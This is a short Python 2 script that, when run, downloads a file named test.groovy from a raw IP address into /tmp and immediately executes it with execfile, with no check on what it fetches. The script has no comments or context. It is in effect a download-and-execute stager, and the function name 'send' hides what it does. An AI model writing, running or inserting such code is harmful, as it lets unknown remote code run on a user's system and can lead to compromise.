import urllib
import os

def send():
    try:
        url = "http://112.162.188.41/test.groovy"
        local_file = "/tmp/test.groovy"

        urllib.urlretrieve(url, local_file)
        execfile(local_file)

    except Exception as e:
        print(e)

send()